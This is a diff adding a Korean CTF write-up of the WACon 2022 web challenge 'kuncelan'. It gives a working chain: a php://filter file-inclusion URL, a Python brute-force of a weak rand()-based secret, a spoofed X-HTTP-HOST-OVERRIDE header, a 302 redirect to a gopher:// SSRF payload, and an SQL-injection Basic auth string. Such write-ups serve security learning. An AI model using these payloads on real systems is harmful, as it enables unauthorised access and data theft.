@@ -1,0 +1,99 @@
+---
+title: "2022 WACon CTF - kuncelan Writeup"
+description: "LFI, Hash Cracking, SSRF, Gopher Protocol을 이용한 문제 풀이"
+date: 2022-06-26
+published: true
+ctf: "WACon 2022"
+category: "web"
+difficulty: "medium"
+tags: ["lfi", "ssrf", "gopher", "hash-cracking"]
+---
+
+## kuncelan
+
+> http://114.203.209.112:8000/index.phtml?fun_004ded7246=php://filter/convert.base64-encode/resource=/var/www/html/load
+
+### 1. LFI 취약점 발견
+
+첫 번째로 LFI 취약점이 존재했습니다. `php://filter`를 통해 소스코드를 추출할 수 있었습니다.
+
+```php
+// load.phtml 추출 결과
+function gen($user){
+    return substr(sha1((string)rand(0,getrandmax())),0,20);
+}
+
+if(!isset($_SESSION['X-SECRET'])){
+    $_SESSION["X-SECRET"] = gen();
+}
+```
+
+### 2. Hash Cracking
+
+`getrandmax()`는 약 21억 정도밖에 안 되기 때문에 개인 PC로도 짧은 시간 안에 크랙할 수 있습니다.
+
+```python
+from arang import *
+
+xtoken = b"b0b32995820dad31a559a8611a610f9b3c57072b8fd757739c3605e50877d2fd"
+
+for i in range(40000000, 500000000):
+    xsecret = he(sha1(str(i)))[:20]
+    t = he(sha256(xsecret + b"guest"))
+    if xtoken == t:
+        print(xsecret)
+        break
+    if i % 10000000 == 0:
+        print(f"[+] {i} : {xsecret} {t}")
+```
+
+X-SECRET 값을 얻으면 admin 용 X-TOKEN을 생성할 수 있습니다.
+
+### 3. IP 검증 우회
+
+```php
+$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) 
+    ? $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] 
+    : $_SERVER['REMOTE_ADDR']);
+
+if ( $IP === "127.0.0.1" ){
+    // curl 기능 사용 가능
+}
+```
+
+`X-HTTP-HOST-OVERRIDE` 헤더를 추가하여 `127.0.0.1`로 설정하면 우회됩니다.
+
+### 4. SSRF via 302 Redirect
+
+cURL 옵션에 `CURLOPT_FOLLOWLOCATION`이 설정되어 있어서 302 Redirect를 따라갑니다.
+
+내 서버에서 Gopher 프로토콜로 리다이렉트:
+
+```php
+<?php
+header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aAuthorization:%20Basic%20YWRtaW4nfHwxIzpndWVzdA==%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%203%0d%0a%0d%0aa=a%0d%0a%0d%0a");
+?>
+```
+
+### 5. SQLi를 통한 플래그 획득
+
+Basic Authorization을 SQL 쿼리에 넣는 것을 발견하고 SQLi를 수행:
+
+```
+Authorization: Basic YWRtaW4nfHwxIzpndWVzdA==
+// admin'||1#:guest
+```
+
+Gopher로 HTTP raw packet을 만들어 전송하면 플래그 획득!
+
+## Flag
+
+```
+WACon{Try_using_Gophhhher_ffabcdbc}
+```
+
+## 배운 점
+
+- `getrandmax()`의 범위가 작아 해시 크래킹이 가능함
+- `X-HTTP-HOST-OVERRIDE` 같은 비표준 헤더로 IP 검증 우회 가능
+- `CURLOPT_FOLLOWLOCATION` + 302 Redirect + Gopher로 SSRF 수행 가능
